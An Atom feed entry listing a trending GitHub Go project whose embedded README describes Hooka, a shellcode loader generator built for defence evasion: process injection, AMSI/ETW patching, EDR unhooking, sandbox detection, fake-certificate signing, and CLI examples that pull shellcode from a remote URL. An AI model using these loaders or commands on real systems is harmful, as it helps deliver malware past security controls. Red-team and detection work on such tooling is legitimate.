<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub Go Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2024-12-10T01:31:03Z</updated>
  <subtitle>Daily Trending of Go in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>D3Ext/Hooka</title>
    <updated>2024-12-10T01:31:03Z</updated>
    <id>tag:github.com,2024-12-10:/D3Ext/Hooka</id>
    <link href="https://github.com/D3Ext/Hooka" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Shellcode loader generator with multiples features&lt;/p&gt;&lt;hr&gt;&lt;p align=&#34;center&#34;&gt; &lt;/p&gt;&#xA;&lt;h1 align=&#34;center&#34;&gt;Hooka&lt;/h1&gt; &#xA;&lt;h4 align=&#34;center&#34;&gt;Shellcode loader generator with multiples features&lt;/h4&gt; &#xA;&lt;h6 align=&#34;center&#34;&gt;Coded with ðŸ’™ by D3Ext&lt;/h6&gt; &#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;a href=&#34;https://opensource.org/licenses/MIT&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/license-MIT-_red.svg?sanitize=true&#34;&gt; &lt;/a&gt; &lt;a href=&#34;https://github.com/D3Ext/Hooka/raw/main/CHANGELOG.md&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/maintained%3F-yes-brightgreen.svg?sanitize=true&#34;&gt; &lt;/a&gt; &lt;a href=&#34;https://github.com/D3Ext/go-recon/issues&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=flat&#34;&gt; &lt;/a&gt; &lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;a href=&#34;https://raw.githubusercontent.com/D3Ext/Hooka/main/#introduction&#34;&gt;Introduction&lt;/a&gt; â€¢ &lt;a href=&#34;https://raw.githubusercontent.com/D3Ext/Hooka/main/#features&#34;&gt;Features&lt;/a&gt; â€¢ &lt;a href=&#34;https://raw.githubusercontent.com/D3Ext/Hooka/main/#usage&#34;&gt;Usage&lt;/a&gt; â€¢ &lt;a href=&#34;https://raw.githubusercontent.com/D3Ext/Hooka/main/#library&#34;&gt;Library&lt;/a&gt; â€¢ &lt;a href=&#34;https://raw.githubusercontent.com/D3Ext/Hooka/main/#disclaimer&#34;&gt;Disclaimer&lt;/a&gt; &lt;/p&gt; &#xA;&lt;h1&gt;Introduction&lt;/h1&gt; &#xA;&lt;p&gt;Hooka is able to generate shellcode loaders with multiple capabilities. It is also based on other tools like &lt;a href=&#34;https://github.com/boku7/BokuLoader&#34;&gt;BokuLoader&lt;/a&gt;, &lt;a href=&#34;https://github.com/optiv/Freeze&#34;&gt;Freeze&lt;/a&gt; or &lt;a href=&#34;https://github.com/icyguider/Shhhloader&#34;&gt;Shhhloader&lt;/a&gt;, and it tries to implement more evasion features. Why in Golang? Why not?&lt;/p&gt; &#xA;&lt;h1&gt;Features&lt;/h1&gt; &#xA;&lt;p&gt;This tool is able to generate loaders with this features:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Multiple shellcode injection techniques:&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;SuspendedProcess&lt;/li&gt; &#xA;   &lt;li&gt;ProcessHollowing&lt;/li&gt; &#xA;   &lt;li&gt;NtCreateThreadEx&lt;/li&gt; &#xA;   &lt;li&gt;EtwpCreateEtwThread&lt;/li&gt; &#xA;   &lt;li&gt;NtQueueApcThreadEx&lt;/li&gt; &#xA;   &lt;li&gt;No-RWX&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Get shellcode from raw file, PE, DLL or from a URL&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;EXE and DLL are supported as output loader formats&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Encrypt shellcode using:&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;AES&lt;/li&gt; &#xA;   &lt;li&gt;3DES&lt;/li&gt; &#xA;   &lt;li&gt;RC4&lt;/li&gt; &#xA;   &lt;li&gt;XOR&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;AMSI and ETW patching (enabled by default)&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Random variables and function names&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Shikata Ga Nai obfuscation (see &lt;a href=&#34;https://github.com/EgeBalci/sgn&#34;&gt;here&lt;/a&gt;)&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Multiple ways to detect sandboxing&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Enable ACG Guard protection&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Block non-Microsoft signed DLLs from injecting into created processes&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Capable of unhooking user-mode hooks via multiple techniques:&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Classic&lt;/li&gt; &#xA;   &lt;li&gt;Full DLL&lt;/li&gt; &#xA;   &lt;li&gt;Perun&#39;s Fart technique&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;em&gt;&lt;strong&gt;Phant0m&lt;/strong&gt;&lt;/em&gt; technique to suspend EventLog threads (see &lt;a href=&#34;https://github.com/hlldz/Phant0m&#34;&gt;here&lt;/a&gt;)&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Windows API hashing (see &lt;a href=&#34;https://www.ired.team/offensive-security/defense-evasion/windows-api-hashing-in-malware&#34;&gt;here&lt;/a&gt;)&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Sign shellcode loader with fake or real certificates&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Strings obfuscation via Caesar cipher (see &lt;a href=&#34;https://en.wikipedia.org/wiki/Caesar_cipher&#34;&gt;here&lt;/a&gt;)&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Compress code weight using Golang compile and UPX (if it&#39;s installed)&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Compute binary entropy of the loader&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Compute MD5, SHA1 and SHA256 checksums to keep track of the loader&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;Installation&lt;/h1&gt; &#xA;&lt;p&gt;Just clone the repository like this:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;git clone https://github.com/D3Ext/Hooka&#xA;cd Hooka&#xA;make&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;After that you will find the binary under the &lt;code&gt;build/&lt;/code&gt; folder&lt;/p&gt; &#xA;&lt;h1&gt;Usage&lt;/h1&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Help panel&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;pre&gt;&lt;code&gt;  _   _                   _              _&#xA; | | | |   ___     ___   | | __   __ _  | |&#xA; | |_| |  / _ \   / _ \  | |/ /  / _` | | |&#xA; |  _  | | (_) | | (_) | |   &amp;lt;  | (_| | |_|&#xA; |_| |_|  \___/   \___/  |_|\_\  \__,_| (_)&#xA;&#xA;Usage of Hooka:&#xA;  REQUIRED:&#xA;    -i, --input string        payload to inject in raw format, as PE, as DLL or from a URL&#xA;    -o, --output string       name of output file (i.e. loader.exe)&#xA;    -f, --format string       format of the payload to generate (available: exe, dll) (default exe)&#xA;&#xA;  EXECUTION:&#xA;    --proc string      process to spawn (in suspended state) when needed for given execution technique (default notepad.exe)&#xA;    --exec string      technique used to load shellcode (default &#34;SuspendedProcess&#34;):&#xA;                         SuspendedProcess&#xA;                         ProcessHollowing&#xA;                         NtCreateThreadEx&#xA;                         EtwpCreateEtwThread&#xA;                         NtQueueApcThreadEx&#xA;                         No-RWX&#xA;&#xA;  AUXILIARY:&#xA;    -a, --arch string       architecture of the loader to generate (default amd64)&#xA;    -c, --cert string       certificate to sign generated loader with (i.e. cert.pfx)&#xA;    -d, --domain string     domain used to sign loader (i.e. www.microsoft.com)&#xA;&#xA;  ENCODING:&#xA;    --enc string         encrypts shellcode using given algorithm (available: aes, 3des, rc4, xor) (default none)&#xA;    --sgn                use Shikata Ga Nai to encode generated loader (it must be installed on path)&#xA;    --strings            obfuscate strings using Caesar cipher&#xA;&#xA;  EVASION:&#xA;    --unhook string       unhooking technique to use (available: full, peruns)&#xA;    --sandbox             enable sandbox evasion&#xA;    --no-amsi             don&#39;t patch AMSI&#xA;    --no-etw              don&#39;t patch ETW&#xA;    --hashing             use hashes to retrieve function pointers&#xA;    --acg                 enable ACG Guard to prevent AV/EDR from modifying existing executable code&#xA;    --blockdlls           prevent non-Microsoft signed DLLs from injecting in child processes&#xA;    --phantom             suspend EventLog threads using Phant0m technique. High privileges needed, otherwise loader skips this step&#xA;    --sleep               delay shellcode execution using a custom sleep function&#xA;&#xA;  EXTRA:&#xA;    --calc              use a calc.exe shellcode to test loader capabilities (don&#39;t provide input file)&#xA;    --compress          compress generated loader using Golang compiler and UPX if it&#39;s installed&#xA;    -r, --rand          use a random set of parameters to create a random loader (just for testing purposes)&#xA;    -v, --verbose       enable verbose to print extra information&#xA;    -h, --help          print help panel&#xA;&#xA;Examples:&#xA;  hooka -i shellcode.bin -o loader.exe&#xA;  hooka -i http://192.168.1.126/shellcode.bin -o loader.exe&#xA;  hooka -i shellcode.bin -o loader.exe --exec NtCreateThreadEx --unhook full --sleep 60 --acg&#xA;  hooka -i shellcode.bin -o loader.dll --domain www.domain.com --enc aes --verbose&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Generate a simple EXE loader&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;$ hooka_linux_amd64 -i shellcode.bin -o loader.exe&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Generate a DLL loader&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;$ hooka_linux_amd64 -i shellcode.bin -o loader.dll -f dll&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Use custom config (various examples)&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;$ hooka_linux_amd64 -i shellcode.bin -o loader.exe --hashing --agc --sleep --verbose&#xA;$ hooka_linux_amd64 -i shellcode.bin -o loader.exe --exec ProcessHollowing --sgn --strings --blockdlls&#xA;$ hooka_linux_amd64 -i http://xx.xx.xx.xx/shellcode.bin --sandbox --sleep --domain www.microsoft.com --verbose&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h1&gt;Demo&lt;/h1&gt; &#xA;&lt;img src=&#34;https://raw.githubusercontent.com/D3Ext/Hooka/main/assets/demo1.png&#34;&gt; &#xA;&lt;img src=&#34;https://raw.githubusercontent.com/D3Ext/Hooka/main/assets/demo2.png&#34;&gt; &#xA;&lt;h1&gt;TODO&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Add direct and indirect syscall&lt;/li&gt; &#xA; &lt;li&gt;Add Chacha20 cypher to encrypt shellcode&lt;/li&gt; &#xA; &lt;li&gt;More OPSEC features&lt;/li&gt; &#xA; &lt;li&gt;General improvement&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;Library&lt;/h1&gt; &#xA;&lt;p&gt;The official Golang package has most of the already mentioned features and some others. To make use of it, see &lt;a href=&#34;https://github.com/D3Ext/Hooka/tree/main/examples&#34;&gt;here&lt;/a&gt; and &lt;a href=&#34;https://github.com/D3Ext/Hooka/tree/main/pkg/hooka&#34;&gt;here&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h1&gt;References&lt;/h1&gt; &#xA;&lt;p&gt;You can take a look at some of the mentioned techniques here:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;https://github.com/C-Sto/BananaPhone&#xA;https://github.com/timwhitez/Doge-Gabh&#xA;https://github.com/Ne0nd0g/go-shellcode&#xA;https://github.com/optiv/Freeze&#xA;https://github.com/f1zm0/acheron&#xA;https://github.com/Enelg52/OffensiveGo&#xA;https://github.com/trickster0/TartarusGate&#xA;https://github.com/Kara-4search/HookDetection_CSharp&#xA;https://github.com/RedLectroid/APIunhooker&#xA;https://github.com/plackyhacker/Peruns-Fart&#xA;https://github.com/rasta-mouse/TikiTorch&#xA;https://github.com/phra/PEzor&#xA;https://github.com/S1ckB0y1337/Cobalt-Strike-CheatSheet&#xA;https://github.com/chvancooten/maldev-for-dummies&#xA;https://blog.sektor7.net/#!res/2021/perunsfart.md&#xA;https://teamhydra.blog/2020/09/18/implementing-direct-syscalls-using-hells-gate/&#xA;https://www.ired.team/offensive-security/defense-evasion/detecting-hooked-syscall-functions#checking-for-hooks&#xA;https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++&#xA;https://www.ired.team/offensive-security/defense-evasion/retrieving-ntdll-syscall-stubs-at-run-time&#xA;https://www.ired.team/offensive-security/defense-evasion/windows-api-hashing-in-malware&#xA;https://winternl.com/detecting-manual-syscalls-from-user-mode/&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h1&gt;Disclaimer&lt;/h1&gt; &#xA;&lt;p&gt;Use this project under your own responsability! The author is not responsible of any bad usage of the project.&lt;/p&gt; &#xA;&lt;h1&gt;License&lt;/h1&gt; &#xA;&lt;p&gt;This project is under &lt;a href=&#34;https://github.com/D3Ext/Hooka/raw/main/LICENSE&#34;&gt;MIT&lt;/a&gt; license&lt;/p&gt; &#xA;&lt;p&gt;Copyright Â© 2024, &lt;em&gt;D3Ext&lt;/em&gt;&lt;/p&gt;</summary>
  </entry>
</feed>